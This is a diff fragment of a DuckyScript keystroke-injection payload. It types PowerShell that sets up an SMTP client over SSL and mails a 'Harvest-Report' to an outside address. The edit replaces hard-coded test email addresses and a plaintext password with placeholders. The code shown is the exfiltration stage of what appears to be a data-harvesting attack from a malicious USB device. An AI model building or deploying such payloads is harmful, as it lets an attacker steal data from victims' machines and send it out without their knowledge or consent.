@@ -36,14 +36,14 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('testforducky@outlook.com', 'helloworld001')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('sender_email', 'sender_password')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'testforducky@outlook.com'
+STRING $ReportEmail.From = 'sender_email'
 ENTER
 DELAY 200
-STRING $ReportEmail.To.Add('testforducky@gmail.com')
+STRING $ReportEmail.To.Add('receiver_email')
 ENTER
 STRING $ReportEmail.Subject = "Harvest-Report"
 ENTER
